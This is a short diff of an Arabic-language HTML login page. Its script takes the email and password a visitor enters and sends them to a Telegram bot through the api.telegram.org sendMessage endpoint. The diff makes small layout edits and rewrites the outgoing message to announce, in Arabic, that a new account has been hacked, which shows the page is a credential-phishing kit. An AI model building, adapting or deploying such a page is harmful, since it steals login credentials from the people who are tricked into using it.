@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
@@ -11,7 +10,7 @@
 
     .login-box {
       background: #fff;
-      width: 360px;
+      width: 280px;
       margin: 100px auto;
       padding: 40px;
       box-shadow: 0 0 8px rgba(0,0,0,0.1);
@@ -73,9 +72,6 @@
       <input type="password" id="password" placeholder="كلمة السر" required>
       <button type="submit">تسجيل الدخول</button>
     </form>
-    <div class="id-box">
-      <p>📌 ID: <span id="showId"></span></p>
-    </div>
     <div class="footer">© 2025 Medo Broblems</div>
   </div>
 
@@ -113,7 +109,7 @@
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
-      const message = `📥 تسجيل دخول جديد:\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}`;
+      const message = `📥 - تم اختراق حساب جديد :- \n📧 - الإيميل:${email}\n🔑 - الباسورد: ${password}`;
 
       const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
 
